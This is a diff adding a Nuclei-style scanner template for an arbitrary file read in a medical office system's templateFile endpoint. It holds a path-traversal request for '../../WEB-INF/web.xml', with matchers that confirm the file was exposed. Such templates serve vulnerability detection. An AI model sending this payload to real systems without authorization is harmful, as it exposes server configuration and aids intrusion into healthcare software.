@@ -1,0 +1,21 @@
+id: poc-yaml-donghua-templatefile-readfile
+info:
+  name: "东华医疗协同办公系统 templateFile 接口任意文件读取"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 东华医疗协同办公系统
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/common/templateFile?template_name=../../WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<web-app"
+          - "<context-param>"
+          - "<servlet-mapping>"
+        part: body
